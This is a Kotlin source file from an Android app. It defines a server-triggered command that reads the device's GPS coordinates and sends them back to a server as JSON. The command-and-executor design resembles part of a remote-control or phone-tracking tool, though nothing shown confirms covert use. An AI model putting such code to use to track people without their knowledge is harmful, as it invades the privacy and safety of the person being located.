package com.hc.calling.commands.gps

import android.content.Context
import android.location.Location
import com.google.gson.Gson
import com.hc.calling.commands.Command
import com.hc.calling.commands.Executor

/**
 * Created by ChanHong on 2019/3/22
 *
 */
class GPS(context: Context) : Command(), Executor {
    var context: Context? = null

    init {
        this.context = context
    }

    companion object {
        const val SEND_GPS = "send_gps"  //event from server
        const val GPS = "gps" //event to server
        const val LONGITUDE = "longitude"
        const val LATITUDE = "Latitude"
    }

    override fun execute(data: Any) {

        GPSUtils.getInstance(context).getLngAndLat(object : GPSUtils.OnLocationResultListener {
            override fun onLocationResult(location: Location?) {

                val data = mutableMapOf<String, Double>()
                data.put(LONGITUDE, location!!.longitude)
                data.put(LATITUDE, location.latitude)
                emitData(GPS, Gson().toJson(data))
            }

            override fun OnLocationChange(location: Location?) {

            }

        })
    }

}